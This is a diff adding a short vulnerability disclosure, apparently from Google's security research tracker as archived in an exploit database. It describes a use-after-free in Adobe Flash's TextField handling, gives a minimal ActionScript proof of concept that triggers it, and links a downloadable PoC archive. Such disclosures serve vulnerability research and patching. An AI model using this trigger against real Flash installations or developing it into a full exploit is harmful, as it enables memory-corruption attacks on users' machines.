@@ -1,0 +1,33 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=583
+
+If a TextField variable is set to a value with toString defined, and the TextField is updated, a use-after-free can occur if the toString method frees the TextField's parent. A minimal PoC is as follows:
+
+var mc = this.createEmptyMovieClip("mc", 301);
+var my_txt = mc.createTextField("my_txt", 302, 0, 0, 100, 100); 
+trace(my_txt);
+my_txt.variable = "today_date"; 
+mc.today_date = "blah"; 
+var times = 0;
+ 
+var date_interval:Number = setInterval(updateDate, 500);
+ 
+function updateDate() { 
+    mc.today_date = {toString : func}; 
+}
+
+function func(){
+	if(times == 0){
+		times++;
+		mc.removeMovieClip();
+	}
+
+	return "test";
+	
+	}
+
+A sample fla and swf are attached.
+
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39049.zip
+
